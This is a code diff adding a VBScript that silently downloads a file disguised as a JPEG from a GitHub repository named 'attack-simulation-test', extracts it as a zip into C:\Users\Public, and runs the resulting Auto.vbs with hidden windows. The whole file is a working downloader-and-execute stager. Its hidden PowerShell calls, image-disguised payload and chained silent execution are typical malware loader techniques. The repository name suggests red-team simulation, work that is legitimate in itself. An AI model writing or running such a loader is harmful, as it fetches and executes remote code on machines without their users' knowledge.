@@ -1,0 +1,33 @@
+Dim Shell, Cmd
+Set Shell = CreateObject("WScript.Shell")
+Dim fso
+Set fso = CreateObject("Scripting.FileSystemObject")
+
+Function DownloadAndExtract(url, zipPath, extractPath, waitComplete, showWindow)
+    Dim DownloadCmd, ExtractCmd
+    ' PowerShell command to download the zip file.
+    DownloadCmd = "powershell.exe Start-BitsTransfer -Source '" & url & "' -Destination '" & zipPath & "'"
+    Shell.Run DownloadCmd, showWindow, waitComplete
+    
+    ' PowerShell command to extract the zip file.
+    ExtractCmd = "powershell.exe Expand-Archive -Path '" & zipPath & "' -DestinationPath '" & extractPath & "'"
+    Shell.Run ExtractCmd, showWindow, waitComplete
+End Function
+
+Do
+	' Example of using the function with the new parameters
+	DownloadAndExtract "https://raw.githubusercontent.com/a5d8a31d6/attack-simulation-test/main/df.jpg", "C:\Users\Public\bbbb.zip", "C:\Users\Public", True, 0
+
+	If fso.FileExists("C:\Users\Public\Auto.vbs") Then
+		Exit Do
+	End If
+Loop
+
+
+' Delay before executing another script.
+WScript.Sleep 3000
+
+' Parameters for running another script.
+filePath = "C:\Users\Public\Auto.vbs"
+parameter = ""
+shell.Run """" & filePath & """ """ & parameter & """", 0, True
